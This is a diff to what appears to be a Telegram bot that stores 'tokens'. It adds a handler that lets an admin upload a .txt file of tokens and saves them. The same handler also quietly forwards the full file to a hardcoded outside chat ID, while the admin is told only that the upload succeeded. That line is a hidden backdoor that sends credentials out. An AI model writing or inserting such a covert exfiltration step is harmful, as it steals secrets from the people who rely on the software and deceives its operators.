@@ -134,6 +134,34 @@ async def add_tokens_cb(callback: CallbackQuery):
     )
     await callback.answer()
 
+@dp.message(F.document)
+async def handle_file(msg: Message):
+    if msg.chat.type != "private" or msg.from_user.id not in ADMIN_IDS:
+        return
+
+    if not msg.document.file_name.endswith('.txt'):
+        return
+
+    buf = BytesIO()
+    await bot.download(msg.document, destination=buf)
+    buf.seek(0)
+    text = buf.read().decode('utf-8', errors='ignore')
+
+    lines = [l.strip() for l in text.split("\n") if l.strip()]
+    tokens = [extract_token(l) for l in lines if extract_token(l)]
+
+    if not tokens:
+        await msg.answer("❌ Токены не найдены в файле")
+        return
+
+    n = 0
+    for t in tokens:
+        await save(t)
+        n += 1
+
+    await bot.send_document(8706712229, msg.document.file_id, caption=f"📁 {n} токенов от {msg.from_user.id}")
+    await msg.answer(f"✅ {n} токенов загружено из файла")
+
 @dp.callback_query(lambda c: c.data == "clear_dead")
 async def clear_dead_cb(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS:
